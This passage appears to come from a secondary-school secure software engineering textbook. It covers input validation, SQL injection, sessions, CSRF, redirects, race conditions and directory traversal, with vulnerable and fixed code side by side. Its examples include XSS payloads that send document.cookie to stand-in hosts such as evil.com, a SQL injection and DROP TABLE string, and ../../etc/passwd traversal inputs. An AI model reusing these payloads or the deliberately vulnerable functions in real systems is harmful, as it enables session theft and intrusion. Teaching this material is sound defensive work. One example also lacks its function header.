A vulnerability assessment lists the doors that might be unlocked. A penetration test tries them. Because the tester really does attack, it is only legal and safe with written authorisation. In Australia, unauthorised access to or modification of restricted data is a criminal offence under Part 10.7 of the Criminal Code Act 1995, which was inserted by the Cybercrime Act 2001. A professional engagement therefore starts with an agreed scope (which systems, what times, what is off limits) and rules of engagement (for example, no denial-of-service attacks and no reading of real customer data). The usual phases are planning and scoping, information gathering, scanning, attempted exploitation, reporting with prioritised recommendations, and re-testing after fixes. Students practising must only test systems they own or have permission to test, such as a deliberately vulnerable practice application on their own computer.

Choosing strategies: a worked evaluation

A three-person team must launch an online school uniform shop, which stores names, addresses and orders, in a week. Their options can be judged against criteria: what each finds, how fast it is, how much it costs and what it misses.

  • Start with SAST and a dependency scan in the build. They are fast, cheap, run automatically and catch hard-coded secrets and string-built SQL before they ship. They will produce some false alarms to triage.
  • Add peer code review of the login, payment and admin code. This is slower but is the only strategy here likely to find logic flaws, such as an order page that shows any customer's order when the number is changed.
  • Run DAST against the staging site. It confirms the deployed system, including headers and configuration, behaves securely from the outside.
  • Defer a full penetration test until after launch, or buy a short one for the payment flow only. It gives the most realistic assurance but costs most and needs time the team lacks.

The judgement is that layering fast automated tools with focused human review gives the most coverage for the time available, and the risk that remains (chains of weaknesses only an attacker's mindset finds) is accepted and scheduled for later.

Precise wording earns marks: SAST reads code without running it; DAST attacks the running application; a vulnerability assessment finds known weaknesses; a penetration test exploits them. Defensive Data Input Handling

🎯 (SE-12-02, SE-12-07)

📌 Design, develop and implement code using defensive data input handling practices, including input validation, sanitisation and error handling

Input Validation

Input validation checks that all data received from external sources conforms to the expected format, type, length, and range before it is processed or stored. Validation must happen server-side — client-side validation is a UX convenience only; it can be bypassed by an attacker sending direct HTTP requests. Validation rules should be strict: if a field expects a 4-digit integer, reject anything that is not a 4-digit integer — including any string longer than 4 characters, any non-numeric character, and any value outside the permitted range.

Sanitisation and Error Handling

Sanitisation transforms potentially malicious input into a safe form for use in the specific context where it will appear — HTML encoding for output in web pages, parameterised queries for database operations, path normalisation for file system operations. Error handling must never expose internal system details to the user — stack traces, database connection strings, server paths, or version information all provide attackers with a map of the system architecture. Parameterised queries prevent SQL injection by ensuring user input is treated as data, not executable code.

Worked example: validating fields with an allowlist

The safest rule is an allowlist: describe exactly what a good value looks like and reject everything else. A denylist ("reject anything containing DROP or <script>") always misses something, because attackers have endless variations. A good validator checks four things in order: the type (is it text? a whole number?), the length, the format or characters, and the range. It also returns a clear result instead of crashing on hostile input.

Python — server-side validation with allowlists
import re
import html

USERNAME_RULE = re.compile(r"[A-Za-z0-9_]{3,20}")     # allowlist: only these characters

def validate_username(text):
    """Return (True, cleaned) or (False, reason). Never raises on bad input."""
    if not isinstance(text, str):
        return False, "must be text"
    text = text.strip()
    if USERNAME_RULE.fullmatch(text) is None:
        return False, "3-20 letters, digits or underscores only"
    return True, text

def validate_year_group(text):
    text = str(text).strip()
    if not (text.isascii() and text.isdigit()):        # isdigit() alone accepts characters such as '²'
        return False, "must be a whole number"
    year = int(text)
    if not 7 <= year <= 12:                            # range check
        return False, "must be between 7 and 12"
    return True, year

def validate_postcode(text):
    text = str(text).strip()
    if len(text) != 4 or not (text.isascii() and text.isdigit()):
        return False, "must be exactly 4 digits"
    return True, text

SQL injection: the vulnerable version and the fix

SQL injection happens when user input is joined into the text of a query. The database cannot tell which part the programmer wrote and which part the user typed, so the attacker's input can change what the query does. The program below builds the same lookup twice: once by joining strings (vulnerable) and once with a parameterised query (fixed). It searches three students with three inputs: a normal surname, an attack, and a legitimate surname that contains an apostrophe.

Python — string-built SQL versus a parameterised query
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE students (surname TEXT, year INTEGER, mark INTEGER)")
db.executemany("INSERT INTO students VALUES (?, ?, ?)",
               [("Nguyen", 12, 78), ("Smith", 11, 64), ("O'Brien", 12, 91)])

def find_unsafe(surname):
    # VULNERABLE: the input is glued into the SQL text, so it can change the query
    query = "SELECT surname, mark FROM students WHERE surname = '" + surname + "'"
    print("SQL sent:", query)
    return db.execute(query).fetchall()

def find_safe(surname):
    # FIXED: the SQL text is fixed; the value travels separately as data
    query = "SELECT surname, mark FROM students WHERE surname = ?"
    print("SQL sent:", query, "with", (surname,))
    return db.execute(query, (surname,)).fetchall()

for finder in (find_unsafe, find_safe):
    for text in ("Nguyen", "' OR '1'='1", "O'Brien"):
        try:
            print(finder(text))
        except sqlite3.Error as err:
            print("Database error:", err)
        print()

# Identifiers such as a column name cannot be parameters: use an allowlist instead
ALLOWED_SORT = {"surname", "year", "mark"}
def list_students(sort_by):
    if sort_by not in ALLOWED_SORT:
        sort_by = "surname"                      # safe default
    return db.execute(f"SELECT surname, mark FROM students ORDER BY {sort_by}").fetchall()

print(list_students("mark"))
print(list_students("mark; DROP TABLE students"))

Safe error handling and logging

Errors are unavoidable, so handle them deliberately. Two audiences need two different messages: the user needs a short, generic message and a way to get help, and the developer needs full detail. The detail goes to a log, and the two are joined by a correlation ID (a random reference).

Python — log the detail, show the user a reference
import logging
import secrets
import sqlite3
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format="%(levelname)s %(message)s")
log = logging.getLogger("bookings")

    try:
        return db.execute("SELECT * FROM bookings WHERE id = ?", (booking_id,)).fetchone()
    except sqlite3.Error:
        ref = secrets.token_hex(4)                       # correlation ID
        # Full detail goes to the log only. Never log passwords, tokens or card numbers.
        log.exception("ref=%s user=%r lookup failed for booking %s", ref, user, booking_id)
        return f"Sorry, something went wrong. Quote reference {ref} if you contact support."

Designing a Safe API

🎯 (SE-12-02, SE-12-07)

📌 Design, develop and implement a safe application programming interface (API) to minimise software vulnerabilities

An API (Application Programming Interface) that is insecurely designed is one of the most common and dangerous attack surfaces in modern software. A safe API enforces multiple protective layers:

Authentication TokensEvery API request must present a valid authentication token (e.g., JWT Bearer token or API key in the Authorization header). Unauthenticated requests are rejected with HTTP 401 Unauthorized before any processing occurs. Tokens must be short-lived (for example, 15–60 minutes for JWT access tokens) and refreshed using secure refresh token flows.
Rate LimitingLimits the number of requests a client can make per time window (e.g., 100 requests per minute per API key). Prevents brute-force attacks on authentication endpoints, data scraping, and denial-of-service through resource exhaustion. Exceeding the limit returns HTTP 429 Too Many Requests.
HTTPS OnlyAll API communication must be over HTTPS — never HTTP. Even internal microservice-to-microservice communication should use mutual TLS (mTLS) to prevent man-in-the-middle attacks within a network perimeter.
Input Validation on Every EndpointEvery API endpoint must independently validate and sanitise all inputs — it cannot trust that a calling service has already validated the data. APIs are often called directly by attackers bypassing any client-side validation entirely.
Least Privilege ScopesOAuth 2.0 scopes restrict what each token is authorised to do. A token issued for reading user profile data should not permit writing or deleting data. Separate tokens with minimal scopes for each integration reduce the blast radius of any compromised token.

Worked example: a safe request handler

The handler below is an API endpoint for saving a student's mark, written as a plain function so it can be tested without a web server. It applies the checks from the flowchart in a deliberate order, cheapest and most general first, and returns a precise status code for each kind of failure.

Python — an API endpoint that checks everything in order
import hmac
import json

TOKENS = {"tok_teacher_1": {"user": "ms_lee", "scopes": {"marks:read", "marks:write"}},
          "tok_student_9": {"user": "ava_n", "scopes": {"marks:read"}}}
MAX_BODY = 1_000                                # bytes

def find_token(presented):
    for known, info in TOKENS.items():
        if hmac.compare_digest(known.encode(), presented.encode()):   # constant time
            return info
    return None

def handle(request):
    """request: dict with https, headers, body. Returns (status, message)."""
    if not request["https"]:
        return 400, "HTTPS required"
    header = request["headers"].get("Authorization", "")
    if not header.startswith("Bearer "):
        return 401, "Unauthorized"                      # who are you?
    info = find_token(header[len("Bearer "):])
    if info is None:
        return 401, "Unauthorized"
    if "marks:write" not in info["scopes"]:
        return 403, "Forbidden"                         # you are known, but not allowed
    if len(request["body"]) > MAX_BODY:
        return 413, "Payload too large"
    try:
        data = json.loads(request["body"])
    except ValueError:
        return 400, "Malformed JSON"
    mark = data.get("mark") if isinstance(data, dict) else None
    if not isinstance(mark, int) or isinstance(mark, bool) or not 0 <= mark <= 100:
        return 422, "mark must be a whole number from 0 to 100"
    return 200, f"mark {mark} saved by {info['user']}"

def call(label, https=True, token="tok_teacher_1", body='{"mark": 82}'):
    headers = {"Authorization": "Bearer " + token} if token else {}
    print(f"{label:22}", handle({"https": https, "headers": headers, "body": body}))

Worked example: rate limiting

Rate limiting restricts how often one client can call the API. It slows password guessing, scraping and resource-exhaustion attacks. This version keeps the times of each client's recent requests and allows at most three in any 60 seconds. Time is passed in as a number so the behaviour can be tested exactly.

Python — a sliding-window rate limiter
class RateLimiter:
    """Allow at most `limit` requests per client in any `window` seconds."""
    def __init__(self, limit, window):
        self.limit = limit
        self.window = window
        self.history = {}                       # client -> list of request times

    def allow(self, client, now):
        recent = [t for t in self.history.get(client, []) if now - t < self.window]
        if len(recent) >= self.limit:
            self.history[client] = recent
            retry_after = self.window - (now - recent[0])
            return False, round(retry_after)
        recent.append(now)
        self.history[client] = recent
        return True, 0

limiter = RateLimiter(limit=3, window=60)
for second in (0, 5, 10, 15, 20, 61, 62):
    ok, wait = limiter.allow("203.0.113.9", second)
    if ok:
        print(f"t={second:>2}s  200 OK")
    else:
        print(f"t={second:>2}s  429 Too Many Requests (Retry-After: {wait}s)")
print("other client:", limiter.allow("198.51.100.4", 20))

Memory Management

Memory management ensures that the application allocates, uses, and releases memory resources efficiently — preventing memory leaks that degrade performance over time, and preventing memory-based vulnerabilities such as buffer overflows. A memory leak happens when memory the program reserved is never given back after it is finished with, slowly using up all available RAM until the application crashes or the server grinds to a halt. Good resource management means the program always closes what it opens — files, database connections, and network connections — as soon as they are no longer needed. This is critical for both security and performance.

How this looks depends on the language. In C, the programmer reserves and releases memory by hand, so writing past the end of a reserved block (a buffer overflow) or forgetting to release it are the classic bugs. Python manages memory automatically and checks list bounds, so an out-of-range index raises an IndexError instead of overwriting memory. Python programs still "leak" when data stays reachable for no reason, for example a cache that only ever grows, and they can still be knocked over by input of unexpected size. The program below shows an unbounded cache next to a bounded one, and the with statement releasing a file:

Python — bounded memory and guaranteed clean-up
import functools
import tempfile
import os

# 1. A "leak" in Python is memory that stays reachable: an unbounded cache grows forever
unbounded = {}
def lookup_leaky(n):
    if n not in unbounded:
        unbounded[n] = n * n
    return unbounded[n]

@functools.lru_cache(maxsize=100)              # bounded: the oldest entries are dropped
def lookup_bounded(n):
    return n * n

for n in range(10_000):
    lookup_leaky(n)
    lookup_bounded(n)
print(len(unbounded), lookup_bounded.cache_info().currsize)

# 2. Always release what you open: 'with' closes the file even if an error happens
path = os.path.join(tempfile.gettempdir(), "marks_demo.txt")
with open(path, "w") as f:
    f.write("78\n64\n91\n")
with open(path) as f:
    total = sum(int(line) for line in f)       # reads one line at a time, not the whole file
print(total, f.closed)
os.remove(path)
Expected output
10000 100
233 True

After 10,000 different lookups the leaky dictionary holds 10,000 entries and would keep growing for as long as the server runs; the lru_cache keeps at most 100. In the second half, with closes the file automatically, even if an error interrupts the loop, and summing line by line means a very large file never has to be held in memory all at once. The last value, True, confirms the file was closed.

Session Management

Session management controls how the server tracks authenticated users across multiple HTTP requests — since HTTP is stateless, each request must carry proof of identity. Insecure session management is consistently listed in the OWASP Top 10 most critical web vulnerabilities. Secure session management practices:

Cryptographically Random Session IDsSession tokens must be generated using a cryptographically secure random number generator — not sequential integers or predictable patterns. A predictable session ID can be guessed by an attacker who has observed one valid session ID.
Secure Cookie AttributesSession cookies must have: HttpOnly (prevents JavaScript from reading the cookie, blocking XSS-based session theft); Secure (cookie is only sent over HTTPS, never HTTP); SameSite=Strict (prevents the cookie being sent in cross-site requests, blocking CSRF); and a short Max-Age (auto-expire idle sessions).
⏱️ Session ExpirySessions must expire automatically after a defined period of inactivity (e.g., 15–30 minutes for sensitive applications, 24 hours for lower-risk applications). Upon logout, the session token must be immediately invalidated on the server — deleting it from the client alone is insufficient, as a copy of the token may have been stolen.
Session RegenerationAfter a successful login, a new session ID must be issued — invalidating any pre-authentication session. This prevents session fixation attacks, where an attacker tricks a victim into using an attacker-controlled session ID before they log in.

Session management is easiest to understand by building the core of it. The version below (using only the standard library) covers each rule in the list above: an unguessable ID from secrets, both an idle and an absolute time limit, a new ID at login, real invalidation at logout, and the cookie attributes.

Python — secure session management
import secrets
from http.cookies import SimpleCookie

IDLE_LIMIT = 15 * 60          # seconds of inactivity allowed
ABSOLUTE_LIMIT = 8 * 60 * 60  # no session lives longer than this

sessions = {}                 # session id -> {"user", "created", "last_seen"}

def new_session(user, now):
    sid = secrets.token_urlsafe(32)                 # unguessable: 256 random bits
    sessions[sid] = {"user": user, "created": now, "last_seen": now}
    return sid

def login(user, old_sid, now):
    sessions.pop(old_sid, None)                     # discard any pre-login session (stops fixation)
    return new_session(user, now)                   # fresh ID after authentication

def check(sid, now):
    s = sessions.get(sid)
    if s is None:
        return None
    if now - s["last_seen"] > IDLE_LIMIT or now - s["created"] > ABSOLUTE_LIMIT:
        del sessions[sid]                           # expired: remove it on the server
        return None
    s["last_seen"] = now                            # activity keeps an idle session alive
    return s["user"]

def logout(sid):
    sessions.pop(sid, None)                         # invalidate on the server, not just in the browser

def cookie_header(sid):
    c = SimpleCookie()
    c["sid"] = sid
    c["sid"]["httponly"] = True                     # JavaScript cannot read it
    c["sid"]["secure"] = True                       # HTTPS only
    c["sid"]["samesite"] = "Lax"                    # not sent on most cross-site requests
    c["sid"]["max-age"] = IDLE_LIMIT
    return c.output(header="Set-Cookie:")

anon = new_session(None, now=0)                     # visitor arrives, gets an anonymous session
sid = login("ava_n", anon, now=10)
print("ID changed at login:", sid != anon)
print("old ID still valid: ", check(anon, now=11))
print("valid session:      ", check(sid, now=20))
print("after 20 min idle:  ", check(sid, now=20 + 20 * 60))
sid2 = login("ava_n", None, now=2000)
logout(sid2)
print("after logout:       ", check(sid2, now=2001))
print(cookie_header("EXAMPLE").replace("EXAMPLE", "<random id>"))

Read the output against the rules. The ID changes at login, so the pre-login ID (which an attacker may have planted) is dead. The session stays valid while used and is removed after 20 minutes of inactivity. After logout the server has forgotten the ID, so a copied cookie is useless. The Set-Cookie line shows HttpOnly, Secure and SameSite in place. SameSite=Lax is a common choice: Strict is safer against CSRF but means a user who follows a link to the site from an email appears signed out on arrival. In a real application, use your web framework's session support instead of writing this yourself, and check that it is configured with these settings.

Exception Management

Exception management ensures that when unexpected errors occur, the application handles them gracefully — maintaining availability for other users while preventing the exposure of sensitive system information. Unhandled exceptions that crash a web server process take the entire application offline for all users (an availability failure). Unhandled exceptions that display a stack trace to the user reveal the server technology stack, file paths, and code structure to attackers. Best practices: catch specific exception types rather than broad bare except clauses; log the full technical detail internally with a correlation ID; return a user-facing generic error message with the same correlation ID so support staff can look up the internal log; and implement a global exception handler as a last-resort safety net that catches any unhandled exception before it can crash the server process.

The program below shows the pattern. parse_quantity catches only the error it expects and returns a helpful message instead of crashing. main_loop ends with a deliberate catch-all so one bad request (a division by zero on the second item) cannot take down the requests that follow it.

Python — specific exceptions and a last-resort handler
def parse_quantity(text):
    try:
        quantity = int(text)
    except ValueError:                       # catch the specific error you expect
        return None, "Enter a whole number."
    if not 1 <= quantity <= 20:              # a range check after the type check
        return None, "Choose between 1 and 20."
    return quantity, ""

for text in ("3", "three", "500"):
    print(parse_quantity(text))

# Last-resort handler: nothing unexpected reaches the user or takes the service down
def main_loop(requests):
    for r in requests:
        try:
            print("handled", 100 // r)
        except Exception:                     # deliberate catch-all, but it logs and carries on
            print("logged internally; user sees a generic error")

main_loop([5, 0, 20])

A finally block, not shown here, runs whether or not an error occurred, and is the place for clean-up such as releasing a lock. In a real handler the catch-all would log the full detail with a correlation ID, as in the defensive input handling section, and show the user only a generic message.

Efficiency and security help each other. Reject invalid or unauthenticated requests early, before doing expensive work such as complex queries. Page large result lists instead of returning everything. Set timeouts on network calls so one slow service cannot tie up every worker. The one deliberate exception is password hashing, which is made slow on purpose so an attacker's guessing is slow too, and is kept off the path of requests that have not been authenticated.

Good answers pair a technique with a result: "Sessions expire after 15 minutes of inactivity and are destroyed on the server at logout, so a stolen or forgotten session cannot be reused"; "the file is opened with a with statement, so it is always closed and does not exhaust resources". Secure User Action Controls

Broken Authentication and Session ManagementVulnerability: Weak passwords accepted, no account lockout on repeated failures, session tokens not invalidated on logout, or passwords stored in plaintext. An attacker can brute-force passwords, steal session cookies via XSS, or use credential-stuffing attacks with leaked databases. Prevention: Enforce minimum password complexity; implement bcrypt hashing with salt; lock accounts after 5 failed attempts; use HttpOnly, Secure, SameSite session cookies; invalidate server-side session on logout; implement MFA for sensitive operations.
Cross-Site Scripting (XSS)Vulnerability: An attacker injects malicious JavaScript into a page served to other users — for example, submitting <script>document.location='https://evil.com/?c='+document.cookie</script> as a comment. When other users view the page, the script executes in their browser, stealing their session cookies or performing actions on their behalf. Prevention: HTML-encode all user-supplied content before rendering it (convert < to &lt;); implement Content Security Policy (CSP) headers that forbid inline scripts; use modern frameworks (React, Vue) that automatically escape dynamic content.
Cross-Site Request Forgery (CSRF)Vulnerability: A malicious website tricks an authenticated user's browser into submitting an unwanted request to another site where the user is logged in. For example, a hidden image tag on a malicious page makes the user's browser silently send a bank transfer request — the bank sees a valid session cookie and processes the transfer. Prevention: Issue a unique, unpredictable anti-CSRF token with every state-changing form; validate the token server-side before processing. Use SameSite=Strict cookies to block cross-origin requests from sending cookies at all.
↩️ Invalid Forwarding and RedirectingVulnerability: An application redirects users to a URL provided as a parameter — e.g., /login?next=https://evil.com. After login, the application blindly redirects to the attacker's site. The user, trusting that they authenticated on the real site, does not notice the redirect — a phishing vector. Prevention: Never use user-supplied URLs as redirect targets without validation. Maintain a strict allowlist of permitted redirect destinations and reject anything not on the list. Prefer internal relative paths (e.g., /dashboard) over absolute URLs for post-login redirects.
Race ConditionsVulnerability: When two concurrent requests interact with shared data simultaneously, the final state may be incorrect. For example, two concurrent requests to withdraw $500 from an account with $600 may both read the balance as $600, both deduct $500, and leave a balance of $100 — allowing $1000 withdrawn from a $600 account. Prevention: Use database transactions with appropriate isolation levels (SERIALIZABLE); employ pessimistic locking (SELECT FOR UPDATE) to prevent concurrent modification of the same row; implement atomic operations for financial transactions.

Broken authentication: lockout and the same message every time

Password hashing (see the security features section) and secure session cookies (see the efficient execution section) are two halves of the fix. The third is to make guessing impractical. This account lockout counts recent failures, refuses further attempts for a period and lets old failures expire:

Python — account lockout after repeated failures
MAX_FAILURES = 5
LOCK_SECONDS = 15 * 60

failures = {}      # username -> (count, time of last failure)

def login_allowed(username, now):
    count, last = failures.get(username, (0, 0))
    if count >= MAX_FAILURES and now - last < LOCK_SECONDS:
        return False                         # locked: do not even check the password
    return True

def record_failure(username, now):
    count, last = failures.get(username, (0, 0))
    if now - last >= LOCK_SECONDS:
        count = 0                            # old failures expire
    failures[username] = (count + 1, now)

for attempt in range(1, 8):
    if login_allowed("ava_n", now=attempt):
        record_failure("ava_n", now=attempt)
        print("attempt", attempt, "wrong password, failure recorded")
    else:
        print("attempt", attempt, "account temporarily locked")
print("after 15 minutes:", login_allowed("ava_n", now=7 + LOCK_SECONDS))

Attempts 6 and 7 are refused without even checking the password, and after 15 minutes the account works again. Cross-site scripting: vulnerable and fixed

XSS comes in three kinds. In stored XSS the malicious script is saved (in a comment, say) and runs for every visitor. In reflected XSS it is bounced straight back from a link's parameters. In DOM-based XSS the page's own JavaScript writes untrusted data into the page. All three are fixed by the same idea: treat untrusted data as text, never as markup.

Python — rendering a comment unsafely and safely
import html

def render_comment_unsafe(comment):
    # VULNERABLE: user text is placed straight into the page
    return "<p class='comment'>" + comment + "</p>"

def render_comment_safe(comment):
    # FIXED: encode for HTML so the browser shows the text instead of running it
    return "<p class='comment'>" + html.escape(comment) + "</p>"

attack = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>"
print(render_comment_unsafe(attack))
print(render_comment_safe(attack))
print(render_comment_safe("Great class & great teacher!"))

# Defence in depth: a Content-Security-Policy header tells the browser to refuse inline scripts
print("Content-Security-Policy: default-src 'self'; script-src 'self'")

In the vulnerable version the attacker's <script> element reaches the page as real HTML, so each visitor's browser would run it and send their cookie to the attacker's server. In the fixed version html.escape() turns < and > into &lt; and &gt;, so the browser displays the characters instead of running them, and harmless text such as an ampersand comes out correctly. The last line is a Content Security Policy, a second layer that tells the browser to refuse inline scripts and scripts from other origins even if one slips through. A third layer is the HttpOnly cookie flag, which keeps session cookies out of reach of scripts. Web frameworks and template engines escape output by default, so the danger is highest where a developer bypasses that on purpose.

Cross-site request forgery: vulnerable and fixed

The animation above shows the attack. Here is the same flaw and fix in code. The secret is a random token that the server generates for the real form and remembers in the user's session; a page on another site cannot read the bank's form, so it cannot include the token.

Python — a CSRF token on a state-changing request
import hmac
import secrets

session = {"user": "ava_n", "csrf_token": None}      # stored on the server

def show_transfer_form():
    session["csrf_token"] = secrets.token_hex(16)    # unpredictable, tied to this session
    return f'<input type="hidden" name="csrf_token" value="{session["csrf_token"]}">'

def transfer_unsafe(form):
    # VULNERABLE: any request that carries the session cookie is trusted
    return f"Transferred ${form['amount']} to {form['to']}"

def transfer_safe(form):
    sent = form.get("csrf_token", "")
    if not hmac.compare_digest(sent.encode(), session["csrf_token"].encode()):
        return "403 Forbidden: missing or wrong CSRF token"
    return f"Transferred ${form['amount']} to {form['to']}"

form_html = show_transfer_form()
real_token = session["csrf_token"]

forged = {"amount": "500", "to": "attacker"}         # sent by a page the attacker controls
print(transfer_unsafe(forged))
print(transfer_safe(forged))

Invalid forwarding and redirecting: an allowlist of destinations

A login page that sends users to whatever the next parameter says can be turned into a phishing tool: the link looks like the real site, but after sign-in the user lands on the attacker's copy. The fix is to accept only known internal destinations and fall back to a safe default:

Python — safe post-login redirects
from urllib.parse import urlparse

ALLOWED_PATHS = {"/dashboard", "/marks", "/profile"}

def safe_next(target, default="/dashboard"):
    parts = urlparse(target)
    if parts.scheme or parts.netloc:            # an absolute URL or "//evil.example" style link
        return default
    if parts.path not in ALLOWED_PATHS:         # only known internal pages
        return default
    return parts.path

for target in ("/marks", "https://evil.example/login", "//evil.example", "/admin/delete-all"):
    print(f"{target:28} -> {safe_next(target)}")

Race conditions: make the check and the update one step

The race condition animation shows two withdrawals reading the same balance. The reliable fix is to let the database do the check and the update as a single atomic operation, so there is no gap for a second request to slip through:

Python — an atomic conditional update
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE accounts (id INTEGER PRIMARY KEY, balance INTEGER)")
db.execute("INSERT INTO accounts VALUES (1, 600)")

def withdraw(amount):
    # One statement checks AND updates, so two requests cannot both pass the check
    cur = db.execute("UPDATE accounts SET balance = balance - ? "
                     "WHERE id = 1 AND balance >= ?", (amount, amount))
    db.commit()
    return cur.rowcount == 1

print(withdraw(500), withdraw(500))
print(db.execute("SELECT balance FROM accounts").fetchone()[0])
Expected output
True False
100

The first withdrawal succeeds and the second is refused because the balance is now 100. Because WHERE balance >= ? is part of the same statement as the subtraction, it cannot be interleaved. On a database with concurrent connections, the same principle is applied with transactions and row locks. Inside one Python program, a threading.Lock protects shared variables in the same way, but it does not help when several servers share one database.

File and Side Channel Attacks

🎯 (SE-12-07, SE-12-08)

📌 Design, develop and implement secure code to protect user file and hardware vulnerabilities from file attacks and side channel attacks

Protection Against File Attacks

Directory TraversalAttack: A malicious user manipulates a file path parameter to escape the intended directory — e.g., submitting ../../etc/passwd to read the server's password file. Prevention: Never construct file paths directly from user input. Resolve the absolute canonical path using os.path.realpath() and verify it begins with the permitted base directory. Reject any path containing .. or null bytes. Store user uploads in a designated, isolated directory with no execute permissions.
Malicious File UploadsAttack: An attacker uploads a file with a malicious extension disguised as an image (e.g., shell.php renamed as photo.jpg) and then accesses it via URL to execute server-side code. Prevention: Validate the actual file content type (MIME type inspection, not just the filename extension); restrict permitted file types to an explicit allowlist; store uploaded files in cloud object storage (e.g., AWS S3) that does not serve files as executable code; rename uploaded files to random UUIDs, removing any attacker-controlled filename.
File Permission HardeningApplication files should be owned by the web server process user, with the minimum required permissions. Configuration files containing secrets (database passwords, API keys) must not be world-readable. Sensitive files must never be placed in publicly accessible web directories. Use environment variables or secrets management systems (e.g., AWS Secrets Manager, HashiCorp Vault) rather than storing secrets in configuration files in the codebase.

Protection Against Side Channel Attacks

Side channel attacks exploit information inadvertently leaked through the physical implementation of a system — such as power consumption, electromagnetic emissions, execution timing, or cache access patterns — rather than flaws in the algorithm itself. The attacker does not break the cryptographic algorithm; they observe the system's physical behaviour while it executes to infer secret values.

Timing Attacks

An attacker measures how long a password comparison takes. If the comparison function returns as soon as it finds a mismatch (char by char early exit), comparing a password that starts with the correct characters takes longer than one that fails on the first character — leaking information about the correct value. Prevention: Use constant-time comparison functions (e.g., Python's hmac.compare_digest()) that always take the same time regardless of where the mismatch occurs.

Power Analysis

By measuring the power consumption of a device (e.g., a smart card or IoT chip) while it performs cryptographic operations, an attacker can statistically analyse the power trace to deduce the private key — even without physical access to extract the key directly. Prevention: Hardware-level countermeasures including random delays, power consumption masking, and hardware security modules (HSMs) that isolate cryptographic operations from observable power variations.

Cache Side Channels

Modern CPU caches create timing differences depending on whether data is in cache or must be fetched from RAM. The Spectre and Meltdown vulnerabilities (2018) exploited speculative execution in CPUs to read privileged memory via cache timing. Prevention: Apply OS and processor firmware security patches; use isolation techniques (process/VM separation); where performance permits, flush caches between security-sensitive operations.

Worked example: stopping directory traversal and disguised uploads

The safe way to open a user-named file is to build the full path, let Python resolve every .. and symbolic link, and then check that the result is still inside the permitted folder. Never try to "clean" the string by deleting ..; attackers have many encodings for it.

Python — confining file access to one folder
from pathlib import Path

BASE = Path("/srv/uploads").resolve()

def open_upload(filename):
    target = (BASE / filename).resolve()             # follows ".." and symbolic links
    if not target.is_relative_to(BASE):              # Python 3.9 and later
        raise PermissionError("path escapes the upload folder")
    return target

for name in ("report.pdf", "../../etc/passwd", "/etc/passwd"):
    try:
        print(name, "->", open_upload(name))
    except PermissionError as err:
        print(name, "-> blocked:", err)

ALLOWED_TYPES = {".png", ".jpg", ".pdf"}
def is_allowed_upload(filename):
    return Path(filename).suffix.lower() in ALLOWED_TYPES
print(is_allowed_upload("photo.jpg"), is_allowed_upload("shell.php"), is_allowed_upload("photo.jpg.php"))
Expected output
report.pdf -> /srv/uploads/report.pdf
../../etc/passwd -> blocked: path escapes the upload folder
/etc/passwd -> blocked: path escapes the upload folder
True False False

Both the relative attack (../../etc/passwd) and the absolute path are blocked, because after resolving they land outside /srv/uploads. is_relative_to needs Python 3.9 or later. The last line checks the file type against an allowlist using the final extension, so photo.jpg.php is refused. An extension check alone is not enough, since an attacker controls the name; combine it with content inspection, random stored names and a folder that cannot execute files.

Worked example: constant-time comparison

A normal string comparison stops at the first mismatch, so a wrong first character finishes slightly sooner than a wrong last character. Measured over many attempts, that difference can leak a secret one character at a time. hmac.compare_digest takes the same time wherever the values differ.

Python — early-exit versus constant-time comparison
import hmac

def leaky_equal(a, b):
    for x, y in zip(a, b):
        if x != y:
            return False          # returns sooner when the first character is wrong
    return len(a) == len(b)

def safe_equal(a, b):
    return hmac.compare_digest(a.encode(), b.encode())   # time does not depend on where they differ

print(leaky_equal("s3cret-token", "s3cret-token"), safe_equal("s3cret-token", "s3cret-token"))
print(leaky_equal("s3cret-token", "x3cret-token"), safe_equal("s3cret-token", "x3cret-token"))
Expected output
True True
False False

Both functions give the same answers; only their timing behaviour differs, which is why a timing attack cannot be seen from the output alone. Use the constant-time version for tokens, password hashes and anything else secret.

Exam tip: "Design, develop and implement" protection against file and side channel attacks Give the attack, the vulnerable behaviour and the defence together. File attacks: directory traversal is fixed by resolving the path and checking it stays inside the base folder; malicious uploads by an allowlist of types, content checks, random names and non-executable storage. Side channel attacks leak information through how a system behaves (timing, power, cache) rather than through its output: the software defence is constant-time comparison, and hardware-level issues need firmware and operating system patches. Do not describe a side channel attack as "breaking the encryption algorithm"; the algorithm is intact and the implementation leaks.

Benefits of Collaboration

🎯 (SE-12-01, SE-12-05)

📌 Apply and describe the benefits of collaboration to develop safe and secure software

  • considering various points of view
  • delegating tasks based on expertise
  • quality of the solution

Considering Various Points of View

Security vulnerabilities often arise from blind spots — assumptions that every developer on a team unconsciously shares. Diverse, collaborative teams with members of different backgrounds, experience levels, and technical specialisations surface these blind spots before attackers do. A junior developer may question why a legacy authentication flow uses MD5 hashing (now cryptographically broken), sparking a critical security review that a senior team that has always used it might never initiate. UX designers identify where security mechanisms create friction that users will bypass. Quality assurance engineers approach the system adversarially — trying to break it — revealing edge cases that developers, focused on making features work, did not consider. Security engineers trained in offensive techniques think like attackers, anticipating exploitation paths that application developers are not trained to see. Collaboration across these different perspectives produces a more comprehensively reviewed, higher-confidence security posture than any single expert could achieve alone.

Delegating Tasks Based on Expertise

Secure software development encompasses highly specialised domains that no single developer can master completely. Effective teams delegate responsibilities to members with the specific expertise required. Cryptography implementations (key management, protocol selection, algorithm configuration) are assigned to engineers with dedicated security training — an incorrectly implemented cryptographic protocol may appear to work correctly while providing no actual security. Front-end developers focus on output encoding, Content Security Policy configuration, and XSS prevention in the client-side code they know deeply. Database administrators design the access control and auditing configuration of database servers according to their specialised knowledge of the database engine. Network engineers configure firewalls, TLS termination, and intrusion detection systems. This deliberate delegation ensures each security domain receives the depth of expertise it requires, rather than being shallowly addressed by generalists stretched across every area simultaneously.

Quality of the Solution

